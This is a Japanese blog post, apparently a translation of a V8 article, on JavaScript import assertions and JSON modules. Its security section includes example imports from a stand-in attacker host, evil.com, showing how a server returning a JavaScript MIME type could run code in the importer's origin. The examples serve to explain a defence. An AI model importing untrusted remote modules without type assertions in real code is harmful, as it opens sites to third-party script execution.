---
title: &apos;インポートアサーション&apos;
author: &apos;Dan Clark ([@dandclark1](https://twitter.com/dandclark1)), インポートアサーションの主張者&apos;
avatars:
  - &apos;dan-clark&apos;
date: 2021-06-15
tags:
  - ECMAScript
description: &apos;インポートアサーションにより、モジュール指定子とともに追加の情報をインポート文に含めることができます&apos;
tweet: &apos;&apos;
---

新しい[インポートアサーション](https://github.com/tc39/proposal-import-assertions)機能により、モジュール指定子とともに追加の情報をインポート文に含めることができます。この機能の初期の用途として、JSON文書を[JSONモジュール](https://github.com/tc39/proposal-json-modules)としてインポート可能にすることがあります:

<!--truncate-->
```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
import json from &apos;./foo.json&apos; assert { type: &apos;json&apos; };
console.log(json.answer); // 42
```

## 背景: JSONモジュールとMIMEタイプ

自然に浮かぶ疑問は、JSONモジュールを次のように単純にインポートできない理由です:

```javascript
import json from &apos;./foo.json&apos;;
```

WebプラットフォームはモジュールリソースのMIMEタイプを実行前に有効性を確認し、このMIMEタイプを使ってリソースをJSONとして扱うかJavaScriptモジュールとして扱うかを判断することも理論的には可能です。

しかし、MIMEタイプだけに依存することには[セキュリティ問題](https://github.com/w3c/webcomponents/issues/839)があります。

モジュールはクロスオリジンでインポート可能で、開発者は第三者ソースからJSONモジュールをインポートすることがあるかもしれません。適切にサニタイズされている限り、JSONをインポートすることでスクリプトが実行されることはないため、基本的に安全だと考えるかもしれません。

しかし、この場合でも第三者のスクリプトが実際に実行される可能性があります。予期せずJavaScript MIMEタイプと悪意のあるJavaScriptペイロードを返すサーバが輸入者のドメインでコードを実行することができるためです。

```javascript
// JavaScript MIMEタイプ (例: `text/javascript`) を
// evil.comが返答した場合、JSを実行します!
import data from &apos;https://evil.com/data.json&apos;;
```

ファイル拡張子を使用してモジュールタイプを判別することはできません。なぜなら、[ウェブ上ではコンテンツタイプの信頼できる指標ではない](https://github.com/tc39/proposal-import-assertions/blob/master/content-type-vs-file-extension.md)からです。そのため、インポートアサーションを用いて期待されるモジュールタイプを示し、この権限昇格の落とし穴を防ぎます。

開発者がJSONモジュールをインポートしたい場合は、それがJSONであることを指定するインポートアサーションを使用する必要があります。ネットワークから受け取ったMIMEタイプが期待されるタイプと一致しない場合、インポートは失敗します:

```javascript
// evil.comが非JSON MIMEタイプで返答した場合は失敗します。
import data from &apos;https://evil.com/data.json&apos; assert { type: &apos;json&apos; };
```

## 動的`import()`

インポートアサーションは、[動的`import()`](https://v8.dev/features/dynamic-import#dynamic)に新しい2番目のパラメータとしても渡すことができます:

```json
// foo.json
{ "answer": 42 }
```

```javascript
// main.mjs
const jsonModule = await import(&apos;./foo.json&apos;, {
  assert: { type: &apos;json&apos; }
});
console.log(jsonModule.default.answer); // 42
```

JSONコンテンツはモジュールのデフォルトエクスポートであるため、`import()`から返されるオブジェクトの`default`プロパティを通じて参照されます。

## 結論

現在、インポートアサーションの唯一の指定された用途はモジュールタイプの指定です。しかし、機能は任意のキー／値アサーションペアを許容するように設計されているため、将来、モジュールインポートを別の方法で制限することが有用になる場合に追加の用途が追加される可能性があります。

一方、新しいインポートアサーション構文を使用したJSONモジュールはChromium 91でデフォルトで利用可能です。[CSSモジュールスクリプト](https://chromestatus.com/feature/5948572598009856)もすぐに登場する予定で、同じモジュールタイプアサーション構文を使用します。

## インポートアサーションのサポート

<feature-support chrome="91 https://chromestatus.com/feature/5765269513306112"
                 firefox="no"
                 safari="no"
                 nodejs="no"
                 babel="yes https://github.com/babel/babel/pull/12139"></feature-support>
